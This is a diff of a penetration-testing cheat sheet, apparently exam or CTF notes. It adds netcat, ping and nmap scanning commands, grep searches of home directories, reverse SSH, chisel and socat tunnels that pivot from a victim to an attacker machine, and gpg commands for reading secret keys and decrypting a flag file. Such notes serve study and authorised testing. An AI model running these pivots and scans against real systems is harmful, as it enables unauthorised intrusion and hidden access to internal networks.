@@ -8,7 +8,19 @@
 
 ### Nmap
 ```
+nc -zv $target 1-65535 2>&1 | grep succeeded
+```
+```
+for i in $(seq 1 65535); do nc -nvz -w 1 $target $i 2>&1; done | grep -v "Connection refused"
+```
+```
+time for i in $(seq 1 254); do (ping -c 1 192.168.122.${i} | grep "bytes from" &); done
+```
+```
 $pwd/tools/general/onetwopunch.sh -t targets.txt -i tap0 -n '-n -vvv -T4  -sV -sC -A --osscan-guess --version-all -oA "$pwd/_output/$(target_ip)/full_tcp_unicorn_nmap" --script=*vuln*'
+```
+```
+nmap -vv --reason -Pn -vvv -A --osscan-guess --version-all -p- $target_ip
 ```
 ```
 nmap -n -vvv -T4 -sV -sC -A --osscan-guess --version-all -p- -oA "$pwd/_output/$(target_ip)/full_tcp_nmap" $target_ip
@@ -36,23 +48,39 @@ nping –tcp-connect -c 1 -p 3389 $target_ip
 ## Searching 
 
 ```
-grep -rnw /home -e "^.*test.*test.*" -l --color
+grep -rRw /home -e "^.*test.*test.*" --color
+# -w - matching substring must either be at the beginning of the line, or preceded by a non-word constituent character
+# -L, --files-without-match
+# -l, --files-with-matches
+# -r, --recursive
+# -R, --dereference-recursive (follow sym-links)
+```
+```
+grep -iRn "example" --color /home
 ```
 
 ## Pivoting 
 
 ```
-ssh -f -N -R 1122:10.5.5.11:22 -R 13306:10.5.5.11:3306 -o "UserKnownHostsFile=/dev/nul l" -o "StrictHostKeyChecking=no" -i /tmp/keys/id_rsa kali@10.11.0.4
+ssh -f -N -R 1122:10.5.5.11:22 -R 13306:10.5.5.11:3306 -o "UserKnownHostsFile=/dev/null" -o "StrictHostKeyChecking=no" -i /tmp/keys/id_rsa kali@10.11.0.4
 ```
 
 Using chisel: <https://github.com/jpillora/chisel>
 - From attacker:
 ```
-.\chisel.exe server -p 8000 --reverse
+.\chisel.exe server -p $source_port --reverse
 ```
 - From victim:
 ```
-.\chisel.exe client 10.10.14.10:8000 R:223:localhost:14147
+.\chisel.exe client $source_ip:$source_port R:223:localhost:14147
+```
+Forward 8888 of current to target:22
+```
+./socat tcp-listen:8888,reuseaddr,fork tcp:$target:22 &
+```
+Forward 2323 to attacker's machine (on attacker's machine do `nc -lvnp $source_port`)
+```
+./socat tcp-listen:2323,reuseaddr,fork, tcp:$source_ip:$source_port &
 ```
 
 ## Docker 
@@ -208,4 +236,10 @@ Base64 to Hex
 
 ```
 echo -n '4as8gqENn26uTs9srvQLyg==' | base64 -D | xxd -p
+```
+```
+gpg --list-secret-keys
+```
+```
+gpg -d root.txt.gpg 
 ```
